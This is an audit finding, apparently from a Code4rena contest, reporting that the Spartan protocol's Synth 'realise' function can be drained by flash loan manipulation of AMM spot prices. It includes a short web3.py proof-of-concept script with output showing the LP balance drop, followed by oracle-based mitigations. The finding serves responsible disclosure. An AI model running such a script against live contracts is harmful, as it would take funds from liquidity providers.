## Tags

- bug
- 3 (High Risk)
- sponsor confirmed
- disagree with severity

# [Synth `realise` is vulnerable to flash loan attacks](https://github.com/code-423n4/2021-07-spartan-findings/issues/40) 

# Handle

jonah1005


# Vulnerability details

## Impact
Synth `realise` function calculates `baseValueLP` and `baseValueSynth` base on AMM spot price which is vulnerable to flash loan attack. Synth's lp is subject to `realise` whenever the AMM ratio is different than Synth's debt ratio. 

The attack is not necessarily required flash loan. Big whale of the lp token holders could keep calling realse by shifting token ratio of AMM pool back and forth.


## Proof of Concept
The vulnerability locates at:
https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L187-L199

Where the formula here is dangerous:
https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L114-L126

https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L210-L217
Here's a script for conducting flashloan attack
```python
flashloan_amount = init_amount
user = w3.eth.accounts[0]
marked_token.functions.transfer(user, flashloan_amount).transact()
marked_token.functions.transfer(token_pool.address, flashloan_amount).transact({'from': user})
token_pool.functions.addForMember(user).transact({'from': user})
received_lp = token_pool.functions.balanceOf(user).call() 
synth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()
token_synth.functions.realise(token_pool.address).transact()
token_pool.functions.transfer(token_pool.address, received_lp).transact({'from': user})
token_pool.functions.removeForMember(user).transact({'from': user})
token_synth.functions.realise(token_pool.address).transact()
synth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()
print('synth_lp_balance_after_realise', synth_balance_after_realise)
print('synth_lp_balance_before_realise', synth_balance_before_realise)

```
Output:
```
synth_balance_after_realise 1317859964829313908162
synth_balance_before_realise 2063953488372093023256
```
## Tools Used
None

## Recommended Mitigation Steps
Calculating Lp token's value base on AMM protocol is known to be dangerous.
There are a few steps that might solve the issue:
1. calculate token's price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle.
2. calculate lp token value based on anti-flashloan formula.  Alpha finance's formula is a good reference: https://blog.alphafinance.io/fair-lp-token-pricing


